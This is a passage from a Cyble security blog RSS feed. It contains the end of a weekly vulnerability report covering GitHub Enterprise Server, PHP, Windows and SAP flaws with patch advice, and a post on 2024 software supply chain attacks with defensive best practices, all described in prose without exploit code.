<p>This XML signature wrapping vulnerability in GitHub Enterprise Server (GHES) has significant implications for organizations that use this platform for source code management and collaboration. An attacker with direct network access can forge a SAML response to provision and/or gain access to a user with site administrator privileges, resulting in unauthorized access to the instance without prior authentication. This <a href="https://cyble.com/solutions/vulnerability-management/">vulnerability</a> affects GHES, a widely used platform for managing source code, making it a high-priority fix. Since GHES is used by organizations to manage the source code of their applications, an attacker could exploit a vulnerability by stealing sensitive information or leveraging unauthorized admin privileges to carry out <a href="https://cyble.com/blog/surge-in-software-supply-chain-attacks-heightens-third-party-vigilance/">supply chain attacks</a>. </p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p><strong>Internet Exposure?</strong> Yes&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p><strong>Patch Available?</strong> This vulnerability affected all versions of GitHub Enterprise Server prior to 3.14 and was fixed in versions 3.13.3, 3.12.8, 3.11.14, and 3.10.16.&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:heading {"level":3} --></p>
<h3 class="wp-block-heading">2. CVE-2024-4577: Critical Vulnerability in PHP&nbsp;</h3>
<p><!-- /wp:heading --></p>
<p><!-- wp:paragraph --></p>
<p><a href="https://cyble.com/blog/cve-2024-4577-ongoing-exploitation-of-a-critical-php-vulnerability/">CVE-2024-4577</a>, a widespread critical vulnerability was initially discovered in May and affects PHP when using Apache and PHP-CGI on Windows. The PHP CGI module may misinterpret characters as PHP options, allowing a malicious user to pass options to the PHP binary being run, revealing the source code of scripts, and running arbitrary PHP code on the server. Recently, researchers discovered that unknown attackers had deployed a newly discovered backdoor dubbed Msupedge on an educational institute’s Windows systems in Taiwan, likely by exploiting this vulnerability. </p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p><strong>Internet Exposure?</strong> Yes&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p><strong>Patch Available?</strong> <a href="https://nvd.nist.gov/vuln/detail/CVE-2024-4577" rel="noreferrer noopener" target="_blank">Yes</a>&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:heading {"level":3} --></p>
<h3 class="wp-block-heading">3. CVE-2024-38193: Elevation of Privilege Vulnerability in Windows Ancillary Function Driver&nbsp;</h3>
<p><!-- /wp:heading --></p>
<p><!-- wp:paragraph --></p>
<p>The Windows Ancillary Function Driver is an entry point into the Windows Kernel for the Winsock protocol. A high-severity elevation of privilege vulnerability in this driver was disclosed, and researchers believe the Lazarus hacking group may have leveraged it to elevate privileges and install the FUDModule rootkit.&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p><strong>Internet Exposure?</strong> No&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p><strong>Patch Available?</strong> <a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-38193" rel="noreferrer noopener" target="_blank">Yes</a>&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:heading {"level":3} --></p>
<h3 class="wp-block-heading">4. CVE-2024-38063: Critical TCP/IP Remote Code Execution Vulnerability in Windows&nbsp;</h3>
<p><!-- /wp:heading --></p>
<p><!-- wp:paragraph --></p>
<p>A critical TCP/IP remote code execution vulnerability in Windows was identified, allowing attackers to trigger buffer overflows that can be used to execute arbitrary code on vulnerable Windows 10, Windows 11, and Windows Server systems. This vulnerability is considered wormable, allowing a remote, unauthenticated attacker to gain elevated code execution by sending specially crafted IPv6 packets to an affected target.&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p><strong>Internet Exposure?</strong> No&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p><strong>Patch Available?</strong> <a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-38063" rel="noreferrer noopener nofollow" target="_blank">Yes</a> </p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:heading {"level":3} --></p>
<h3 class="wp-block-heading">5. CVE-2024-41730: SAP BusinessObjects Business Intelligence Vulnerability&nbsp;</h3>
<p><!-- /wp:heading --></p>
<p><!-- wp:paragraph --></p>
<p>A critical vulnerability in SAP BusinessObjects Business Intelligence (SAP BO) affects organizations that use this centralized suite of reporting and analytics tools for business intelligence. An unauthorized user can obtain a logon token using a REST endpoint, resulting in a high impact on confidentiality, integrity, and availability.&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p><strong>Internet Exposure?</strong> No&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p><strong>Patch Available?</strong> <a href="https://support.sap.com/en/my-support/knowledge-base/security-notes-news/august-2024.html" rel="noreferrer noopener nofollow" target="_blank">Yes</a> </p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:heading --></p>
<h2 class="wp-block-heading">Vulnerabilities and Exploits Discussed in the Underground&nbsp;</h2>
<p><!-- /wp:heading --></p>
<p><!-- wp:paragraph --></p>
<p>In addition to the top vulnerabilities, Cyble researchers observed several other vulnerabilities being discussed in underground forums and channels, raising the profile of these vulnerabilities among attackers. These include:&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:list --></p>
<ul class="wp-block-list"><!-- wp:list-item --></p>
<li><strong>CVE-2024-40348:</strong> A high-severity vulnerability in the Bazaar API, allowing unauthenticated attackers to execute directory traversal.&nbsp;</li>
<p><!-- /wp:list-item --></ul>
<p><!-- /wp:list --></p>
<p><!-- wp:list --></p>
<ul class="wp-block-list"><!-- wp:list-item --></p>
<li><strong>CVE-2024-30088:</strong> A high-severity elevation of privilege vulnerability in the Windows Kernel.&nbsp;</li>
<p><!-- /wp:list-item --></ul>
<p><!-- /wp:list --></p>
<p><!-- wp:list --></p>
<ul class="wp-block-list"><!-- wp:list-item --></p>
<li><strong>CVE-2024-38856:</strong> An incorrect authorization vulnerability in Apache OFBiz, allowing unauthenticated <a href="https://cyble.com/knowledge-hub/what-is-edr/">endpoints</a> to execute screen rendering code of screens if certain preconditions are met. </li>
<p><!-- /wp:list-item --></ul>
<p><!-- /wp:list --></p>
<p><!-- wp:list --></p>
<ul class="wp-block-list"><!-- wp:list-item --></p>
<li><strong>CVE-2024-38213:</strong> A Windows Mark of the Web security feature bypass vulnerability.&nbsp;</li>
<p><!-- /wp:list-item --></ul>
<p><!-- /wp:list --></p>
<p><!-- wp:list --></p>
<ul class="wp-block-list"><!-- wp:list-item --></p>
<li><strong>CVE-2024-2212:</strong> An Eclipse ThreadX vulnerability that can lead to integer wraparound, under-allocations, and heap buffer overflows.&nbsp;</li>
<p><!-- /wp:list-item --></ul>
<p><!-- /wp:list --></p>
<p><!-- wp:heading --></p>
<h2 class="wp-block-heading">Our Recommendations&nbsp;</h2>
<p><!-- /wp:heading --></p>
<p><!-- wp:paragraph --></p>
<p>To protect against these vulnerabilities and exploits, organizations should implement the following <a href="https://cyble.com/knowledge-hub/cybersecurity/">cybersecurity</a> best practices: </p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:heading {"level":3} --></p>
<h3 class="wp-block-heading">1. Implement the Latest Patches&nbsp;</h3>
<p><!-- /wp:heading --></p>
<p><!-- wp:paragraph --></p>
<p>To mitigate vulnerabilities and protect against exploits, regularly update all software and hardware systems with the latest patches from official vendors.&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:heading {"level":3} --></p>
<h3 class="wp-block-heading">2. Implement a Robust Patch Management Process&nbsp;</h3>
<p><!-- /wp:heading --></p>
<p><!-- wp:paragraph --></p>
<p>Develop a comprehensive patch management strategy that includes inventory management, patch assessment, testing, deployment, and verification. Automate the process where possible to ensure consistency and efficiency.&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:heading {"level":3} --></p>
<h3 class="wp-block-heading">3. Implement Proper Network Segmentation&nbsp;</h3>
<p><!-- /wp:heading --></p>
<p><!-- wp:paragraph --></p>
<p>Divide your network into distinct segments to isolate critical assets from less secure areas. Use <a href="https://cyble.com/knowledge-hub/what-is-firewall/">firewalls,</a> VLANs, and access controls to limit access and reduce the attack surface exposed to potential threats. </p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:heading {"level":3} --></p>
<h3 class="wp-block-heading">4. Incident Response and Recovery Plan&nbsp;</h3>
<p><!-- /wp:heading --></p>
<p><!-- wp:paragraph --></p>
<p>Create and maintain an<a href="https://cyble.com/knowledge-hub/what-is-incident-response/"> incident response plan</a> that outlines procedures for detecting, responding to, and recovering from security incidents. Regularly test and update the plan to ensure its effectiveness and alignment with current threats. </p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:heading {"level":3} --></p>
<h3 class="wp-block-heading">5. Monitoring and Logging Malicious Activities&nbsp;</h3>
<p><!-- /wp:heading --></p>
<p><!-- wp:paragraph --></p>
<p>Implement comprehensive monitoring and logging solutions to detect and analyze suspicious activities. Use SIEM (Security Information and Event Management) systems to aggregate and correlate logs for real-time threat detection and response.&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:heading {"level":3} --></p>
<h3 class="wp-block-heading">6. Keep Track of Security Alerts&nbsp;</h3>
<p><!-- /wp:heading --></p>
<p><!-- wp:paragraph --></p>
<p>Subscribe to security advisories and alerts from official vendors, CERTs, and other authoritative sources. Regularly review and assess the impact of these alerts on your systems and take appropriate actions.&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:heading {"level":3} --></p>
<h3 class="wp-block-heading">7. Visibility into Assets&nbsp;</h3>
<p><!-- /wp:heading --></p>
<p><!-- wp:paragraph --></p>
<p>Maintain an up-to-date inventory of all internal and external assets, including hardware, software, and network components. Use asset management tools and continuous monitoring to ensure comprehensive visibility and control over your IT environment.&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:heading {"level":3} --></p>
<h3 class="wp-block-heading">8. Strong Password Policy&nbsp;</h3>
<p><!-- /wp:heading --></p>
<p><!-- wp:paragraph --></p>
<p>Change default passwords immediately and enforce a strong password policy across the organization. Implement <a href="https://cyble.com/blog/multi-factor-authentication-mfa-is-a-part-of-your-cyber-hygiene/">multi-factor authentication </a>(MFA) to provide an extra layer of security and significantly reduce the risk of unauthorized access. </p>
<p><!-- /wp:paragraph --></p>
<p>The post <a href="https://cyble.com/blog/weekly-it-vulnerability-report-august-2024/" rel="nofollow">Weekly IT Vulnerability Report for August 20, 2024: Urgent Fixes Recommended for GitHub, PHP, Windows, and SAP </a> appeared first on <a href="https://cyble.com" rel="nofollow">Cyble</a>.</p>
]]></content:encoded>
<pubDate>Mon, 26 Aug 2024 10:18:32 +0000</pubDate>
</item>
<item>
<title>Surge in Software Supply Chain Attacks Demands Heightened Third-Party Vigilance</title>
<link>https://cyble.com/blog/surge-in-software-supply-chain-attacks-heightens-third-party-vigilance/</link>
<guid>https://cyble.com/blog/surge-in-software-supply-chain-attacks-heightens-third-party-vigilance/</guid>
<content:encoded><![CDATA[
<p><img alt="Blog Image" class="attachment-post-thumbnail size-post-thumbnail wp-post-image" height="600" src="https://cyble.com/wp-content/uploads/2024/08/Blog-Image2-1.webp" tabindex="0" width="1200" /></p>
<p><!-- wp:heading --></p>
<h2 class="wp-block-heading">Key Takeaways&nbsp;</h2>
<p><!-- /wp:heading --></p>
<p><!-- wp:list --></p>
<ul class="wp-block-list"><!-- wp:list-item --></p>
<li>Attacks on the software supply chain have occurred at a rate of at least one every two days in 2024.&nbsp;</li>
<p><!-- /wp:list-item --></p>
<p><!-- wp:list-item --></p>
<li>U.S. companies and IT providers have been by far the most frequent targets, accounting for one-third of all software supply chain attacks.&nbsp;</li>
<p><!-- /wp:list-item --></p>
<p><!-- wp:list-item --></p>
<li>The UK, Australia, Germany, India and Japan have also been frequent targets, as have the aerospace &amp; defense, healthcare and manufacturing sectors.&nbsp;</li>
<p><!-- /wp:list-item --></p>
<p><!-- wp:list-item --></p>
<li>These <a href="https://cyble.com/knowledge-hub/what-is-a-cyber-attack/">cyber attacks</a> are particularly damaging and costly because of their multiplication factor on downstream victims and trusted access to customer environments.&nbsp;</li>
<p><!-- /wp:list-item --></p>
<p><!-- wp:list-item --></p>
<li>Even when the codebase isn’t breached, customer databases contain critical information for threat actors to use in phishing, spoofing and credential attacks. </li>
<p><!-- /wp:list-item --></p>
<p><!-- wp:list-item --></p>
<li>A defense-in-depth approach is required to reduce risk, based on principles of <a href="https://cyble.com/knowledge-hub/what-is-zero-trust-framework/">zero trust</a>, cyber resilience, and secure code practices.&nbsp;</li>
<p><!-- /wp:list-item --></ul>
<p><!-- /wp:list --></p>
<p><!-- wp:heading --></p>
<h2 class="wp-block-heading">Overview&nbsp;</h2>
<p><!-- /wp:heading --></p>
<p><!-- wp:paragraph --></p>
<p>Software supply chain attacks burst into public consciousness in 2020 with news of the SolarWinds Orion attack, and a Kaseya VSA ransomware attack in mid-2021 further underscored the risks that third-party software suppliers can pose to their unsuspecting customers.&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>Attacks resulting from infiltration of an IT supplier’s code base are relatively rare, but the software supply chain – the code, dependencies and applications that all modern organizations rely on – is a source of near-constant vulnerabilities and cyberattacks that place all organizations at risk.&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>Because of their trusted access to IT environments, a category of security tools called third-party risk management (TPRM) has evolved to monitor the security of trusted providers – and to alert downstream users when the risk from these services has increased.&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>Because of their trusted access to customer environments, third-party providers are one of the biggest targets for threat actors. While codebase breaches are relatively rare, a breach of any partner’s business environment can lead to sensitive data being leaked that could give attackers a critical advantage in breaching other environments, including <a href="https://cyble.com/knowledge-hub/what-is-phishing/">phishing</a>, spoofing and credential attacks. And because of the interconnectedness and increasing digital nature of the physical supply chain, any manufacturer or supplier with downstream distribution can be considered a cyber risk. </p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>We’ll look at the frequency and nature of supply chain attacks in 2024 before we focus on important defenses that all organizations with trusted partners should have in place.&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:heading --></p>
<h2 class="wp-block-heading">How Common Are Software Supply Chain Attacks?&nbsp;</h2>
<p><!-- /wp:heading --></p>
<p><!-- wp:paragraph --></p>
<p>Successful supply chain attacks have become a near-daily occurrence in 2024, according to Cyble <a href="https://cyble.com/knowledge-hub/what-is-cyber-threat-intelligence/">threat intelligence</a> data.&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>Cyble’s <a href="https://cyble.com/solutions/dark-web-monitoring/">dark web monitoring</a> found 90 cybercriminal claims of successful supply chain attacks in a six-month period that encompassed February 2024 to mid-August 2024.&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>Not surprising given their reach, IT providers suffered the greatest number of those breaches, 30, or one-third of the total, followed by technology product companies, which experienced 14 of the 90 breaches.&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>Aerospace &amp; defense (9 breaches), manufacturing (9 breaches), and healthcare (8 breaches) were the next most frequent victims of supply chain attacks.&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>In all, 22 of the 25 sectors tracked by Cyble threat researchers have experienced a supply chain attack in 2024 (chart below).&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:image {"id":56651,"sizeSlug":"full","linkDestination":"none","align":"center"} --></p>
<figure class="wp-block-image aligncenter size-full"><img alt="Supply Chain Attacks by Sector 2024" class="wp-image-56651" src="https://cyble.com/wp-content/uploads/2024/08/supply-chain.png" /></figure>
<p><!-- /wp:image --></p>
<p><!-- wp:paragraph --></p>
<p>The U.S. experienced by far the greatest number of supply chain breaches claimed on the <a href="https://cyble.com/knowledge-hub/what-is-the-dark-web/">dark web</a> – 31 in all – followed by the UK (10). Germany and Australia each had five, and Japan and India had four each.&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:heading --></p>
<h2 class="wp-block-heading">A Look at the Nature of Supply Chain Attacks in 2024&nbsp;</h2>
<p><!-- /wp:heading --></p>
<p><!-- wp:paragraph --></p>
<p>Supply chain attacks in 2024 have ranged from the theft of business and customer data to the theft and hijacking of source code, but regardless of the sensitive data access, all such attacks pose a serious threat because of the reach of these suppliers. A recent report from Cyentia found that 99% of Global 2000 companies are directly connected to a vendor that has been hit by a supply chain breach. Here is a look at the range and nature of supply chain attacks and breaches thus far in 2024.&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:heading --></p>
<h2 class="wp-block-heading">jQuery&nbsp;</h2>
<p><!-- /wp:heading --></p>
<p><!-- wp:paragraph --></p>
<p>On July 5, a supply chain attack on the JavaScript npm package manager involving trojanized versions of jQuery was discovered by cybersecurity researchers. The attack targeted the popular JavaScript library jQuery by distributing trojanized versions through npm, GitHub, and jsDelivr. The attackers modified the legitimate jQuery code to exfiltrate sensitive form data from websites. The attack's scope was significant, impacting multiple platforms and package names. The attackers used tactics like obfuscation and misleading version warnings. The attack underscored the urgent need for developers and website owners to verify package authenticity and scrutinize code for suspicious modifications to mitigate supply chain attacks.&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:heading --></p>
<h2 class="wp-block-heading">Polyfill&nbsp;</h2>
<p><!-- /wp:heading --></p>
<p><!-- wp:paragraph --></p>
<p>In late June, a widespread supply chain attack hit over 100,000 websites, including many well-known names, originating from a fake domain that impersonated the Polyfill.js library to inject malware that redirected users to sports betting or pornographic sites. The malware dynamically generated based on HTTP headers, making detection challenging. The attack highlighted the risks of using external code libraries and the importance of vigilance in website security. Mitigation steps included removing cdn.polyfill.io, replacing it with secure alternatives, and caution against relying on unknown entities for JavaScript. The incident underscored the security implications of third-party scripts and the potential for malicious takeovers of widely deployed projects.&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:heading --></p>
<h2 class="wp-block-heading">Programming Language Breach&nbsp;</h2>
<p><!-- /wp:heading --></p>
<p><!-- wp:paragraph --></p>
<p>On July 26, <a href="https://cyble.com/knowledge-hub/cyber-threat-actor-and-types/">threat actor </a>(TA) IntelBroker, posting on the BreachForums cybercrime forum, claimed to offer unauthorized access to a node package manager (npm) and GitHub account pertaining to an undisclosed programming language, for US $20,000. The TA said the offer also includes access to the X (Twitter) account of the associated organization with about 100,000 followers, and private repositories with privileges to push and clone commits. Below is a screenshot of the TA’s claims: </p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:image {"id":56652,"sizeSlug":"large","linkDestination":"none","align":"center"} --></p>
<figure class="wp-block-image aligncenter size-large"><img alt="" class="wp-image-56652" src="https://cyble.com/wp-content/uploads/2024/08/suply-chain-1024x505.png" /></figure>
<p><!-- /wp:image --></p>
<p><!-- wp:heading --></p>
<h2 class="wp-block-heading">CDK Global Inc.&nbsp;</h2>
<p><!-- /wp:heading --></p>
<p><!-- wp:paragraph --></p>
<p>On June 19, automotive dealership software provider CDK Global Inc. was hit by a <a href="https://cyble.com/knowledge-hub/what-is-ransomware/">ransomware</a> attack reportedly perpetrated by the Black Suit ransomware group that disrupted sales and inventory operations of many North American auto dealers, including large dealer networks belong to Group1 Automotive Inc., AutoNation Inc., Premier Truck Group, and Sonic Automotive, all of which informed U.S. authorities that they experienced a multi-week service outage and disruption to dealership operations, including those supporting sales, customer relationship management systems, inventory and accounting functions. However, none of the CDK Global customers reported any malicious activity within their networks, suggesting the attack may have been limited to a service disruption.&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:heading --></p>
<h2 class="wp-block-heading">Insula Group Pty Ltd.&nbsp;</h2>
<p><!-- /wp:heading --></p>
<p><!-- wp:paragraph --></p>
<p>On July 25, BianLian ransomware group claimed to compromise Australia-based Insula Group Pty Ltd. The company provides software solutions used in residential construction and finance broking industries. The ransomware group allegedly exfiltrated 400 GB of documents that included project data, construction data, client information, server data, and company source code.&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:heading --></p>
<h2 class="wp-block-heading">Access Offered to More than 400 Companies&nbsp;</h2>
<p><!-- /wp:heading --></p>
<p><!-- wp:paragraph --></p>
<p>On June 15, IntelBroker, again appearing on BreachForums, offered to sell unauthorized access to more than 400 companies compromised via an undisclosed third-party contractor. The data allegedly included access to integration services of Jira, Bamboo, Bitbucket, GitHub, GitLab, SSH, SFTP, DA, Zabbix, AWS S3, AWS EC2, SVN and Terraform. Additionally, the TA also provided revenue of four significant impacted organizations. Open-source research based on the companies’ revenue and location suggested the impacted organizations could be Lockheed Martin Corporation, Samsung Electronics Co Ltd, General Dynamics, and Apple Inc.&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:heading --></p>
<h2 class="wp-block-heading">Smart-ID&nbsp;</h2>
<p><!-- /wp:heading --></p>
<p><!-- wp:paragraph --></p>
<p>On June 21, the functionality of the Smart-ID electronic identification and authorization app was disrupted after a cyberattack, resulting in difficulties accessing internet banking and other e-services in Latvia, Estonia and elsewhere.&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:heading --></p>
<h2 class="wp-block-heading">Cartier International SNC&nbsp;</h2>
<p><!-- /wp:heading --></p>
<p><!-- wp:paragraph --></p>
<p>On Aug 5, IntelBroker leaked data on BreachForums allegedly pertaining to Cartier International SNC, a France-based luxury goods brand. The TA said the data was stolen from the U.S,-based BORN Group, a global digital marketing agency that specializes in digital transformation and commerce solutions. The TA claimed the data was exfiltrated from AWS S3 storage and also leveraged a local file inclusion (LFI) vulnerability, which led to the exposure of internal files, images, and source code.&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:heading --></p>
<h2 class="wp-block-heading">Code Base Injection Not Required for Supply Chain Attack&nbsp;</h2>
<p><!-- /wp:heading --></p>
<p><!-- wp:paragraph --></p>
<p>Threat actors don’t need to inject malicious code into a tech company’s code base to hack the software supply chain – they only need to exploit a zero-day or unpatched flaw that already exists, as happened in recent attacks hitting customers of MOVEit and Ivanti. And “software dependences,” like an open-source component used in proprietary software, can also introduce vulnerabilities, further expanding the attack surface.&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>The software supply chain falls under the broader category of third-party risk management (TPRM), the partners, vendors, service providers, suppliers and contractors who can unwittingly introduce risk into an organization’s environment. A number of studies have found that more than half of all organizations have experienced a third-party breach, and these breaches tend to be more costly than incidents that occur within an organization.&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>Here are some of the best practices and technologies organizations can use to protect against these growing third-party risks.&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:heading --></p>
<h2 class="wp-block-heading">Zero Trust and Cyber Resilience Help Control Supply Chain Risks&nbsp;</h2>
<p><!-- /wp:heading --></p>
<p><!-- wp:paragraph --></p>
<p>In <a href="https://cyble.com/knowledge-hub/cybersecurity/">cybersecurity,</a> organizations should always “assume breach” and trust no one, and this applies to third-party partners too. If security teams assume that no one can be trusted and that no one can be given safe access to assets, they architect accordingly, with critical systems and data isolated with security controls and duplicated with ransomware-resistant backups.&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>The concept of <em>cyber resilience</em> has been repeatedly stressed in recent years. Instead of focusing solely on the network perimeter and endpoints, resilience and recovery should be built around critical applications and data using practices such as:&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:list --></p>
<ul class="wp-block-list"><!-- wp:list-item --></p>
<li>Network microsegmentation&nbsp;</li>
<p><!-- /wp:list-item --></p>
<p><!-- wp:list-item --></p>
<li>Strong access controls, allowing no more access than is required, with frequent verification&nbsp;</li>
<p><!-- /wp:list-item --></p>
<p><!-- wp:list-item --></p>
<li>A strong source of user identity and authentication, including multi-factor authentication and biometrics, <em>and</em> machine authentication with device compliance and health checks&nbsp;</li>
<p><!-- /wp:list-item --></p>
<p><!-- wp:list-item --></p>
<li>Encryption of data at rest and in transit&nbsp;</li>
<p><!-- /wp:list-item --></p>
<p><!-- wp:list-item --></p>
<li>Ransomware-resistant backups that are immutable, air-gapped and isolated as much as possible&nbsp;</li>
<p><!-- /wp:list-item --></p>
<p><!-- wp:list-item --></p>
<li>Honeypots that lure attackers to fake assets for early breach detection&nbsp;</li>
<p><!-- /wp:list-item --></p>
<p><!-- wp:list-item --></p>
<li>Proper configuration of API and cloud service connections&nbsp;</li>
<p><!-- /wp:list-item --></p>
<p><!-- wp:list-item --></p>
<li>Monitor for unusual activity with SIEM, Active Directory monitoring, and data loss prevention (DLP) tools&nbsp;</li>
<p><!-- /wp:list-item --></p>
<p><!-- wp:list-item --></p>
<li>Routinely assessing and confirming controls through audits, vulnerability scanning and penetration tests&nbsp;</li>
<p><!-- /wp:list-item --></ul>
<p><!-- /wp:list --></p>
<p><!-- wp:heading --></p>
<h2 class="wp-block-heading">Best Practices for Secure Development – and Third-Party Risk Management&nbsp;</h2>
<p><!-- /wp:heading --></p>
<p><!-- wp:paragraph --></p>
<p>Ideally, the most effective place to control software supply chain risks is in the continuous integration and development (CI/CD) process – and customers of these services also have a role to play here.&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>Carefully vetting your partners and suppliers and requiring good security controls in contracts are ways to improve third-party security. <a href="https://cyble.com/solutions/cyber-threat-intelligence/">Cyber threat intelligence</a> services like Cyble will help you assess partner and vendor risk – and alert you to places where you may want to shore up your own security defenses. Cyble’s third-party risk intelligence module evaluates partner security in areas such as cyber hygiene, dark web exposure, spoofing activities, and attack surface and network exposure, noting specific areas for improvement, while Cyble’s AI-powered vulnerability scanning capabilities can help you find and prioritize your own web-facing vulnerabilities.&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>The U.S. National Institute of Standards and Technology (NIST) offers a number of guides on supply chain risk management and best practices. These are important resources both for developers and companies evaluating third-party providers. Make security reviews and requirements part of your procurement process from the start.&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>Here are some questions you should ask vendors and service providers as part of a digital supply chain risk assessment:&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:list --></p>
<ul class="wp-block-list"><!-- wp:list-item --></p>
<li>Is the vendor’s software and hardware design process documented, repeatable and measurable?&nbsp;</li>
<p><!-- /wp:list-item --></p>
<p><!-- wp:list-item --></p>
<li>Does the vendor maintain a software component inventory such as a software bill of materials (SBOM) that spells out the components and other attributes of software developed by the vendor and third parties?&nbsp;</li>
<p><!-- /wp:list-item --></p>
<p><!-- wp:list-item --></p>
<li>Is the mitigation of known vulnerabilities factored into product design through product architecture, run-time protection techniques, and code review?&nbsp;</li>
<p><!-- /wp:list-item --></p>
<p><!-- wp:list-item --></p>
<li>How does the vendor stay current on emerging vulnerabilities? What are vendor capabilities to address new <a href="https://cyble.com/knowledge-hub/zero-day-exploit/">“zero day” vulnerabilities?</a>&nbsp;</li>
<p><!-- /wp:list-item --></p>
<p><!-- wp:list-item --></p>
<li>What controls are in place to manage and monitor production processes?&nbsp;</li>
<p><!-- /wp:list-item --></p>
<p><!-- wp:list-item --></p>
<li>How is configuration management performed? Quality assurance? How is testing done for code quality and vulnerabilities?&nbsp;</li>
<p><!-- /wp:list-item --></p>
<p><!-- wp:list-item --></p>
<li>What levels of <a href="https://cyble.com/knowledge-hub/what-is-malware/">malware </a>protection and detection are performed?&nbsp;</li>
<p><!-- /wp:list-item --></p>
<p><!-- wp:list-item --></p>
<li>What steps are taken to make sure products are tamper-proof? Are the back doors closed?&nbsp;</li>
<p><!-- /wp:list-item --></p>
<p><!-- wp:list-item --></p>
<li>Are physical security measures documented and audited?&nbsp;</li>
<p><!-- /wp:list-item --></p>
<p><!-- wp:list-item --></p>
<li>What access controls, both cyber and physical, are in place? Are they documented and audited?&nbsp;</li>
<p><!-- /wp:list-item --></p>
<p><!-- wp:list-item --></p>
<li>How is customer data protected, stored, retained, and destroyed?&nbsp;</li>
<p><!-- /wp:list-item --></p>
<p><!-- wp:list-item --></p>
<li>What type of employee background checks are conducted and how frequently?&nbsp;</li>
<p><!-- /wp:list-item --></p>
<p><!-- wp:list-item --></p>
<li>What security practice expectations are there for upstream suppliers, and how is adherence to these standards assessed?&nbsp;</li>
<p><!-- /wp:list-item --></p>
<p><!-- wp:list-item --></p>
<li>How secure is the distribution process? Have approved and authorized distribution channels been clearly documented?&nbsp;</li>
<p><!-- /wp:list-item --></ul>
<p><!-- /wp:list --></p>
<p><!-- wp:paragraph --></p>
<p>Services like Cyble’s third-party risk intelligence can help you get started on this process. As more organizations make security a buying criterion, vendors will be forced to respond with better security controls and documentation.&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p>The post <a href="https://cyble.com/blog/surge-in-software-supply-chain-attacks-heightens-third-party-vigilance/" rel="nofollow">Surge in Software Supply Chain Attacks Demands Heightened Third-Party Vigilance</a> appeared first on <a href="https://cyble.com" rel="nofollow">Cyble</a>.</p>
]]></content:encoded>
<pubDate>Tue, 20 Aug 2024 16:57:13 +0000</pubDate>
</item>
</channel>
</rss>